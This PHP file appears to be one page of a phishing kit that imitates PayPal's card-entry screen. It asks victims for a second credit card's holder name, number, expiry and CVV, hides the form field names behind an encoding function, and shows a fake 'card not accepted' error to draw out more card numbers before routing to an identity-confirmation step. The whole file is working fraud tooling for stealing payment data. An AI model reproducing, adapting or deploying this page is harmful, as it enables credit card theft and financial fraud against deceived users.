<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "card2";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

if ($api->config("identity") == "on") {
  $return = 'confirm_identity';
} else {
  $return = 'success';
}

require __DIR__ . '/system/page/header.php';

$html .= '
<div class="title-page">'.$api->text_encode($text['65']).' <a href="'.$return.'"><input class="vx_btn-link pull-right" type="button" value="'.$api->text_encode($text['77']).'"></a></div>
<div class="twbs_alert vx_alert hide" id="MSGError">
<p class="vx_alert-text" style="text-align:left;font-size:15px">
'.$api->text_encode("This card is not accepted. Please use a different card.").'
</p>
</div>
<form name="addCreditOrDebit" method="post" id="card2" autocomplete="off">
<div class="textInput lap" id="DivName" style="margin-bottom: 3px;">
<input type="text" name="'.$api->encypt("cardholder").'" id="Name" placeholder="'.$api->text_encode($text['61']).'">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardNumber" id="cardNumber">
<div class="textInput ccNumber ccNumber ccNum lap" id="DivNumber" style="margin-bottom: 10px;">
<input type="tel" name="'.$api->encypt("cardnum").'" id="Number" placeholder="'.$api->text_encode($text['62']).'">
</div>
<div class="cardLogo">
<span class="fiModule-icon_card" id="DivLogo"></span>
</div>
</div>
<div class="cardInputs">
<div class="expiration js_card_toggleField" style="margin-bottom: -15px;">
<div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="DivExp">
<input type="tel" name="'.$api->encypt("cardexp").'" id="Exp" placeholder="'.$api->text_encode($text['63']." (MM/YY)").'">
</div>
</div>
<div class="js_card_toggleField" id="cardSecurityCode" style="margin-bottom: -15px;">
<div class="textInput csc pull-right csc securityCode lap" id="DivCvv" data-ctype="">
<input type="tel" name="'.$api->encypt("cardcvv").'" id="Cvv" placeholder="'.$api->text_encode($text['64']).'">
</div>
</div>
</div>
</div>
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="'.$api->text_encode($text['59']).'" id="btnConfirm">
<p class="scretlogo"></p>
</form>
<div class="hasSpinner hide" id="loading"></div>';

require __DIR__ . '/system/page/footer.php';
?>
